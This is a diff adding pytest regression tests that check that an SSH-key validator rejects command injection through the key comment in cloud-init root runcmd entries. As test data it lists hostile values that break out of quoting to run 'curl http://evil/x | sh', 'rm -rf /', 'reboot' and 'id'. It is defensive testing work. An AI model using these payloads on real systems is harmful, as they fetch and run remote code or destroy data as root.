@@ -43,6 +43,41 @@ def test_rejects_non_openssh_public_key():
         render_user_data(ssh_public_key="-----BEGIN OPENSSH PRIVATE KEY-----")
 
 
+# ---------------------------------------------------------------------------
+# Root command injection at first boot (fix/ship-review-p0)
+# ---------------------------------------------------------------------------
+
+# The key is interpolated inside single quotes into two ROOT-level runcmd
+# entries. The old validator accepted anything non-empty, newline-free and
+# ssh-/ecdsa-/sk-prefixed, so a quote in the comment closed the quoting and
+# everything after it ran as root while the box was booting.
+_INJECTION_KEYS = [
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 paw-ship-a'; curl -s http://evil/x | sh; echo '",
+    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 paw"; reboot; "',
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 paw$(id)",
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 paw`id`",
+    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 paw; rm -rf /",
+]
+
+
+@pytest.mark.parametrize("hostile", _INJECTION_KEYS)
+def test_rejects_a_key_whose_comment_carries_shell_syntax(hostile: str):
+    """Shape validation — a hostile comment never reaches a command string."""
+    with pytest.raises(ValueError, match="single-line OpenSSH public key"):
+        render_user_data(ssh_public_key=hostile)
+
+
+def test_the_key_is_shell_quoted_in_both_runcmd_entries():
+    """Defence in depth: even a valid key travels quoted, not bare.
+
+    Shape validation alone would be a single point of failure; the two
+    ``echo <key>`` commands must not depend on it.
+    """
+    out = render_user_data(ssh_public_key=_PUBKEY)
+    assert f"echo '{_PUBKEY}'" in out, "authorized_keys write is not shell-quoted"
+    assert f"echo '{_PUBKEY}' | dokku ssh-keys:add admin" in out
+
+
 def test_no_private_key_material_in_output():
     # A PRIVATE key body must never appear — the template only ever gets the
     # public half, but assert the guard so a future edit that passes the wrong
